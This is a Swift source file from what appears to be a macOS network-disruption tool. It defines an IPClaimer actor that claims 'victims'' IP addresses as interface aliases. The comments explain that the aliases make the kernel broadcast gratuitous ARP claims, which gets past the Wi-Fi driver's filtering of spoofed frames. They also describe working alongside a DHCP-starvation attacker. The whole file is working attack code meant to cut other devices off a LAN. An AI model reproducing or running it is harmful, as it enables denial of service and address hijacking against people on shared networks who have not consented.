import Foundation

/// IP-aliasing cut layer — kernel-level spoofing the Wi-Fi driver cannot block.
///
/// Apple's IO80211Family driver on M1+ Macs filters spoofed L2 ARP frames where
/// the ARP `sender_ip` doesn't match an IP assigned to the interface. Our
/// userspace `pcap_inject` writes succeed (frames hit BPF) but the driver
/// silently discards them before transmission.
///
/// The bypass: add the victim's IP as a *host-route alias* on en0 via
/// `ioctl(SIOCAIFADDR)`. Once the kernel believes we own that IP, it sends its
/// OWN gratuitous ARP claiming the address — and the driver cannot drop a
/// frame that the kernel itself authored.
///
/// The real victim sees an IP-conflict announcement and either:
///   1. Defends with their own gratuitous ARP (more L2 noise the AP must
///      broadcast — every client on the LAN sees both claims; whoever they
///      heard last wins their cache),
///   2. Renews DHCP (which our DHCPAttacker is starving in parallel),
///   3. Goes into RFC-5227-defend mode and stops using the IP.
///
/// On stop(), aliases are removed cleanly via `SIOCDIFADDR`. Idempotent so
/// rapid toggle / reconnect doesn't leak addresses.
actor IPClaimer {

    private var iface: String = ""
    private var claimed: Set<String> = []     // IPs we've successfully aliased

    /// Replace the active claim set with `victims`. Adds new aliases, removes
    /// stale ones. Safe to call repeatedly.
    func setVictims(iface: String, victims: [String]) {
        self.iface = iface
        let want = Set(victims)
        let toAdd = want.subtracting(claimed)
        let toRemove = claimed.subtracting(want)

        for ip in toAdd {
            let rc = ip.withCString { ipPtr in
                iface.withCString { ifPtr in
                    wm_iface_add_alias(ifPtr, ipPtr)
                }
            }
            if rc == 0 {
                claimed.insert(ip)
                Log.root.info("IPClaimer: aliased \(ip, privacy: .public) on \(iface, privacy: .public)")
            } else {
                Log.root.error("IPClaimer: SIOCAIFADDR \(ip, privacy: .public) failed errno=\(rc, privacy: .public)")
            }
        }
        for ip in toRemove {
            let rc = ip.withCString { ipPtr in
                iface.withCString { ifPtr in
                    wm_iface_remove_alias(ifPtr, ipPtr)
                }
            }
            if rc == 0 {
                Log.root.info("IPClaimer: removed alias \(ip, privacy: .public)")
            }
            claimed.remove(ip)
        }
    }

    /// Remove every alias we've added. Called on stopSpoof / iface change /
    /// helper shutdown so we don't leave the user's machine claiming random
    /// LAN IPs after a cut session ends.
    func clearAll() {
        let toRemove = claimed
        for ip in toRemove {
            _ = ip.withCString { ipPtr in
                iface.withCString { ifPtr in
                    wm_iface_remove_alias(ifPtr, ipPtr)
                }
            }
        }
        claimed.removeAll()
        if !toRemove.isEmpty {
            Log.root.info("IPClaimer: cleared \(toRemove.count, privacy: .public) aliases")
        }
    }
}
